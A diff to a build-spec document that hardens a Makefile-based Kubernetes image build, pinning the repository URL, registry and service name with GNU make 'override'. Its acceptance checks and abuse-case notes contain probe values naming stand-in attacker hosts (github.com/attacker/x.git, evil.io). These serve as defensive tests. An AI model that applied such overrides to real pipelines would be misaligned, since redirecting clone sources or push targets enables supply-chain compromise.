@@ -76,8 +76,8 @@ Three properties of this repo make a naive copy from a sibling fail at review ra
 - `make -n buca BUILD_TARGET=nukeprod REF=<sha> VERSION=probe` prints neither `docker push` nor `docker rmi`
 - `grep -c '^## Build$' README.md` returns 1; `grep -c 'BUILD_TARGET=<cluster> REF=<sha> VERSION=<tag>' README.md` returns ≥ 1; `grep -c 'build-cluster-bootstrap.sh' README.md` returns ≥ 1
 - `grep -c '^## Unreleased$' CHANGELOG.md` returns 1
-- `grep -c '^override REPO_URL' Makefile.docker` returns 1 and `grep -c 'BUILD_REPO_URL ?=' Makefile.docker` returns 0
-- `make -n build BUILD_TARGET=nukeprod REF=<sha> VERSION=probe REPO_URL=https://github.com/attacker/x.git` still prints `REPO_URL='https://github.com/bborbe/obsidian-redirector.git'` — the caller cannot repoint the Job
+- `grep -c '^override REPO_URL' Makefile.docker` returns 1, `grep -c '^override DOCKER_REGISTRY' Makefile.docker` returns 1, `grep -c '^override SERVICE' Makefile.docker` returns 1, and `grep -c 'BUILD_REPO_URL ?=' Makefile.docker` returns 0
+- `make -n build BUILD_TARGET=nukeprod REF=<sha> VERSION=probe REPO_URL=https://github.com/attacker/x.git DOCKER_REGISTRY=evil.io SERVICE=evil/x` still prints `REPO_URL='https://github.com/bborbe/obsidian-redirector.git'` and `IMAGE='docker.io/bborbe/obsidian-redirector'` — the caller cannot repoint either the clone source or the push target
 - `grep -c 'automountServiceAccountToken: false' hack/build-job.yaml` returns 1
 - `grep -c '^SOURCE_DATE_EPOCH' Makefile.docker` returns ≥ 1
 
@@ -149,7 +149,7 @@ These must hold before the cluster AC can pass; none is created by this spec.
 ## Security / Abuse Cases
 
 - The runner substitutes caller-supplied values into a manifest and into embedded shell, so every value is checked against a character whitelist and rejected for embedded newlines before rendering. Do not add a value path that bypasses that check.
-- The repository URL and the push-secret name are pinned with `override`, not a plain `:=`. A plain `:=` is **overridden by a command-line assignment** in GNU make — measured on this branch: with `REPO_URL :=`, `make build REPO_URL=https://github.com/attacker/x.git` renders that URL into the Job. `override REPO_URL :=` is the only assignment form a caller cannot beat, and the same applies to `PUSH_SECRET`. A configurable clone source on a build that mounts a push credential is the hazard this constraint removes.
+- The repository URL, the push-secret name, and the two inputs that compose the push target (`DOCKER_REGISTRY`, `SERVICE`) are all pinned with `override`, not a plain `:=`. A plain `:=` is **overridden by a command-line assignment** in GNU make — measured on this branch: with `REPO_URL :=`, `make build REPO_URL=https://github.com/attacker/x.git` renders that URL into the Job, and with `DOCKER_REGISTRY` unpinned, `make build BUILD_TARGET=<cluster> DOCKER_REGISTRY=evil.io` moves the push target. `override` is the only assignment form a caller cannot beat. A configurable clone source or push target on a build that mounts a push credential is the hazard this constraint removes.
 - The build Job mounts a push credential from a `build`-namespace secret and runs with `automountServiceAccountToken: false`. The credential is scoped to pushing an image; it grants nothing else.
 - The build container runs as an unprivileged user with the sandbox profiles relaxed because rootless BuildKit requires it. That relaxation is deliberate and must not be copied to the clone init container.
 - `VERSION` is caller-controlled and becomes an image tag and a Job name. The tag is whitelisted and the Job name is sanitized to a valid DNS name, truncated, and stripped of trailing separators.
